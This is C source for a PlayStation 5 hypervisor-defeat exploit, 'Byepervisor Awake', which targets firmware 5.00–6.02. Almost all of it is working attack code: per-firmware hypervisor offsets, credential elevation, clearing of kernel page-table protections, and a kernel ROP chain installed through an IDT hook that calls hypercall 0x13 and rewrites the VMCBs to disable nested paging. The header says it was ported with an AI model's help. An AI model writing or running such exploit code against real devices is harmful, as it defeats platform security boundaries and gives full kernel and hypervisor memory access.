/*
 * Byepervisor Awake — PS5 HV defeat for FW 5.00–6.02
 *
 * First HV defeat from FreeBSD without S3 sleep/resume.
 * Uses Trap Flag single-step to bypass DR0 intercepts,
 * then hypercall 0x13 to remove TMR + DMAP VMCB writes
 * to disable NPT on all 16 cores.
 *
 * Result: full kernel .text R/W, VMCB access, HV memory R/W.
 * Executes in < 2 seconds, no user interaction needed.
 *
 * Usage: send via elfldr after kernel exploit + kstuff
 *   nc -q0 <PS5_IP> 9021 < byepervisor_awake.elf
 *
 * Based on Byepervisor Reborn by EchoStretch/PS5Dev (FW 7.61+)
 * Ported to FW 6.02 by mastersword64 with AI assistance (Claude)
 *
 * Key differences from original Byepervisor Reborn:
 *   - TF (Trap Flag) trigger instead of DR0 breakpoints (blocked on 5.xx-6.xx)
 *   - No S3 suspend/resume needed — fires instantly during normal operation
 *   - hv_unmap_pt_tmr (HC 0x13) instead of break_hv AP startup payload
 *   - Must run on CPU1 (HC 0x13 operates on calling vCPU's VMCB only)
 *
 * Multi-firmware support:
 *   FW 6.02 — CONFIRMED WORKING (diag=0xcafedead00001337)
 *   FW 5.00, 5.02, 5.10, 5.50, 6.00 — offsets from ps5-linux-loader (needs ktext dump for TODO offsets)
 */
#include <stdio.h>
#include <string.h>
#include <stdarg.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <ps5/kernel.h>
#include <sys/syscall.h>

#include "kdlsym.h"
#include "khook.h"
#include "util.h"
#include "paging.h"

#define HV_DEFEAT_MARK  0xcafedead00001337ULL
#define HOOK_IST        6
#define TSS_STRIDE      0x68
#define K_DELTA         0xC60000
#define CAVE_DIAG_OFF   0x700
#define GMET_ENABLE     0x8ULL
#define VMCB_STRIDE     0x2000ULL

// Per-firmware HV constants
typedef struct {
  uint64_t vmcb_base_pa;
  uint64_t hv_shm;
  uint32_t hc13_off;
  int      hook_core;     // CPU core for HC 0x13 (vCPU target)
} fw_hv_config_t;

static int get_fw_config(uint32_t fw, fw_hv_config_t *cfg)
{
  switch (fw & 0xffff0000) {
  case 0x05000000:
    cfg->vmcb_base_pa = 0x62A08000ULL;
    cfg->hv_shm       = 0x62A01000ULL;
    cfg->hc13_off      = 0xB99060;
    cfg->hook_core     = 1;
    return 0;
  case 0x05020000:
    cfg->vmcb_base_pa = 0x62A08000ULL;
    cfg->hv_shm       = 0x62A01000ULL;
    cfg->hc13_off      = 0xB99060;
    cfg->hook_core     = 1;
    return 0;
  case 0x05100000:
    cfg->vmcb_base_pa = 0x62A08000ULL;
    cfg->hv_shm       = 0x62A01000ULL;
    cfg->hc13_off      = 0xB99390;
    cfg->hook_core     = 1;
    return 0;
  case 0x05500000:
    cfg->vmcb_base_pa = 0x62A08000ULL;
    cfg->hv_shm       = 0x62A01000ULL;
    cfg->hc13_off      = 0xB9A180;
    cfg->hook_core     = 1;
    return 0;
  case 0x06000000:
    cfg->vmcb_base_pa = 0x62A57000ULL;
    cfg->hv_shm       = 0x62A22000ULL;
    cfg->hc13_off      = 0xBC36B0;
    cfg->hook_core     = 1;
    return 0;
  case 0x06020000:
    cfg->vmcb_base_pa = 0x62A57000ULL;
    cfg->hv_shm       = 0x62A22000ULL;
    cfg->hc13_off      = 0xBC3690;
    cfg->hook_core     = 1;
    return 0;
  default:
    return -1;
  }
}

uint64_t g_hv_base_pa;

int main(void)
{
  uint32_t fw;
  uint64_t cave, dmap;
  uint64_t kernel_pmap;
  uint64_t pde_addr, pte_addr, pde, pte;
  fw_hv_config_t hvcfg;

  {int one=1;setsockopt(1,IPPROTO_TCP,TCP_NODELAY,&one,sizeof(one));}
  printf("[+] Byepervisor Awake\n");

  fw = kernel_get_fw_version();
  printf("[+] FW: %x.%02x\n", (fw >> 24) & 0xFF, (fw >> 16) & 0xFF);

  if (get_fw_config(fw, &hvcfg) != 0) {
    printf("[!] Unsupported firmware\n");
    notifyf("Byepervisor Awake\nUnsupported FW %x.%02x",
            (fw >> 24) & 0xFF, (fw >> 16) & 0xFF);
    return -1;
  }

  if (kdlsym(KERNEL_SYM_HV_MP_STARTUP_CALL) == 0) {
    printf("[!] Missing offsets for FW %x.%02x (need ktext dump)\n",
           (fw >> 24) & 0xFF, (fw >> 16) & 0xFF);
    notifyf("Byepervisor Awake\nFW %x.%02x: missing offsets\nNeed ktext dump",
            (fw >> 24) & 0xFF, (fw >> 16) & 0xFF);
    return 0;
  }

  kernel_set_ucred_authid(getpid(), 0x4800000000000007);

  cave = kdlsym(KERNEL_SYM_DATA_CAVE);
  if (cave == ktext(0)) {
    printf("[!] DATA_CAVE not set for this FW (need ktext dump)\n");
    notifyf("Byepervisor Awake\nFW %x.%02x: DATA_CAVE missing\nNeed ktext dump",
            (fw >> 24) & 0xFF, (fw >> 16) & 0xFF);
    return 0;
  }

  dmap = kdldmap(0);

  // Check if already defeated
  uint64_t prev = kread64(cave + CAVE_DIAG_OFF);
  printf("[PREV] diag=0x%lx\n", prev);
  if (prev == HV_DEFEAT_MARK) {
    printf("[+] *** HV ALREADY DEFEATED ***\n");
    kHexDump(ktext(0), 0x20);
    uint8_t kb[32];
    kread(ktext(0), kb, 32);
    notifyf("FW %x.%02x ktext[0]:\n%02x %02x %02x %02x %02x %02x %02x %02x\n"
            "%02x %02x %02x %02x %02x %02x %02x %02x",
            (fw >> 24) & 0xFF, (fw >> 16) & 0xFF,
            kb[0],kb[1],kb[2],kb[3],kb[4],kb[5],kb[6],kb[7],
            kb[16],kb[17],kb[18],kb[19],kb[20],kb[21],kb[22],kb[23]);
    sceKernelSleep(2);
    notifyf("Byepervisor Awake\n[HV DEFEATED] FW %x.%02x\nCookie: 0x%lx",
            (fw >> 24) & 0xFF, (fw >> 16) & 0xFF, prev);
    return 0;
  }

  // Pin to target CPU — HC 0x13 operates on calling vCPU's VMCB only
  pin_to_core(hvcfg.hook_core);

  // Calculate TMR_ID from HV constants
  uint64_t tmr_id = (hvcfg.vmcb_base_pa + VMCB_STRIDE + 0x90 - hvcfg.hv_shm - 0x208) / 0x18;

  // Disable guest xotext (needed for post-defeat ktext access)
  kernel_pmap = kdlsym(KERNEL_SYM_PMAP_STORE);
  if (kernel_pmap == ktext(0)) {
    printf("[!] PMAP_STORE not set for this FW (need ktext dump)\n");
    notifyf("Byepervisor Awake\nFW %x.%02x: PMAP_STORE missing",
            (fw >> 24) & 0xFF, (fw >> 16) & 0xFF);
    return 0;
  }

  for (uint64_t addr = ktext(0); addr < ktext(0) + K_DELTA; addr += 0x1000) {
    pde_addr = find_pde(kernel_pmap, addr, &pde);
    if (pde_addr != 0xFFFFFFFFFFFFFFFFull) {
      CLEAR_PDE_BIT(pde, XOTEXT); SET_PDE_BIT(pde, RW);
      kwrite64(pde_addr, pde);
    }
    pte_addr = find_pte(kernel_pmap, addr, &pte);
    if (pte_addr != 0xFFFFFFFFFFFFFFFFull) {
      CLEAR_PDE_BIT(pte, XOTEXT); SET_PDE_BIT(pte, RW);
      kwrite64(pte_addr, pte);
    }
  }
  printf("[+] xotext disabled\n");

  // Build ROP chain: unmap TMR → write VMCBs → reload
  printf("[+] Building chain\n");
  {
    khook_t hook;
    kh_chain_t chain;
    uint8_t chain_buf[0x800];
    int ret;

    ret = kh_init(&hook, kread, kwrite, ktext(0), cave, HOOK_IST);
    if (ret) { printf("[!] kh_init: %d\n", ret); return ret; }
    hook.tss_stride = TSS_STRIDE;
    kh_set_tables(&hook, kdlsym(KERNEL_SYM_IDT_ARRAY), kdlsym(KERNEL_SYM_COMMON_TSS));
    kh_set_core(&hook, hvcfg.hook_core);
    hook.oneshot = 1;
    kh_set_hook_target(&hook, kdlsym(KERNEL_SYM_HV_MP_STARTUP_CALL));

    kh_chain_init(&chain, chain_buf, sizeof chain_buf);

    // Stage 1: chain started marker
    kh_chain_store(&chain, cave + CAVE_DIAG_OFF, 0xDE01DE01DE01DE01ULL);

    // Stage 2: hv_unmap_pt_tmr — removes TMR for this vCPU
    kh_chain_g(&chain, KERNEL_GADGET_POP_RDI);
    kh_chain_q(&chain, tmr_id);
    kh_chain_g(&chain, KERNEL_GADGET_POP_RSI);
    kh_chain_q(&chain, 0x1000);
    kh_chain_g(&chain, KERNEL_GADGET_POP_RDX);
    kh_chain_q(&chain, 0);
    kh_chain_q(&chain, ktext(hvcfg.hc13_off));

    kh_chain_store(&chain, cave + CAVE_DIAG_OFF, 0xDE02DE02DE02DE02ULL);

    // Stage 3: DMAP write GMET_ENABLE to all 16 VMCBs (disables NPT)
    for (int i = 0; i < 16; i++) {
      kh_chain_store(&chain, dmap + hvcfg.vmcb_base_pa + (uint64_t)i * VMCB_STRIDE + 0x90,
                     GMET_ENABLE);
    }

    kh_chain_store(&chain, cave + CAVE_DIAG_OFF, 0xDE03DE03DE03DE03ULL);

    // Stage 4: vmmcall reload — HV re-reads modified VMCBs
    kh_chain_g(&chain, KERNEL_GADGET_POP_RDI);
    kh_chain_q(&chain, 0);
    kh_chain_g(&chain, KERNEL_GADGET_POP_RSI);
    kh_chain_q(&chain, 0);
    kh_chain_g(&chain, KERNEL_GADGET_POP_RDX);
    kh_chain_q(&chain, 0xFFFFFFFFFFFFFFFFULL);
    kh_chain_q(&chain, ktext(hvcfg.hc13_off));

    // Final: defeat marker
    kh_chain_store(&chain, cave + CAVE_DIAG_OFF, HV_DEFEAT_MARK);

    if (chain.err) { printf("[!] chain overflow\n"); return -1; }

    kwrite64(cave + CAVE_DIAG_OFF, 0);

    ret = kh_install(&hook, &chain);
    if (ret) { printf("[!] kh_install: %d\n", ret); return ret; }

    printf("[+] Firing on CPU%d\n", hvcfg.hook_core);
    fflush(stdout);
    kh_trigger(&hook);

    // Restore IDT/IST
    uint64_t idt = kdlsym(KERNEL_SYM_IDT_ARRAY);
    uint64_t tss = kdlsym(KERNEL_SYM_COMMON_TSS);
    kwrite64(idt + 16,     hook.saved_gate_lo);
    kwrite64(idt + 16 + 8, hook.saved_gate_hi);
    kwrite64(tss + (uint64_t)hvcfg.hook_core * TSS_STRIDE + (0x24 + HOOK_IST * 8),
             hook.saved_ist);
  }

  sceKernelSleep(1);
  uint64_t diag = kread64(cave + CAVE_DIAG_OFF);
  printf("[+] diag=0x%lx\n", diag);

  if (diag == HV_DEFEAT_MARK) {
    printf("[+] *** HV DEFEATED! ***\n");
    kHexDump(ktext(0), 0x20);
    uint8_t kb[32];
    kread(ktext(0), kb, 32);
    notifyf("FW %x.%02x ktext[0]:\n%02x %02x %02x %02x %02x %02x %02x %02x\n"
            "%02x %02x %02x %02x %02x %02x %02x %02x",
            (fw >> 24) & 0xFF, (fw >> 16) & 0xFF,
            kb[0],kb[1],kb[2],kb[3],kb[4],kb[5],kb[6],kb[7],
            kb[16],kb[17],kb[18],kb[19],kb[20],kb[21],kb[22],kb[23]);
    sceKernelSleep(2);
    notifyf("Byepervisor Awake\n[HV DEFEATED] FW %x.%02x\nCookie: 0x%lx",
            (fw >> 24) & 0xFF, (fw >> 16) & 0xFF, diag);
  } else {
    printf("[!] Failed (diag=0x%lx)\n", diag);
  }

  return 0;
}
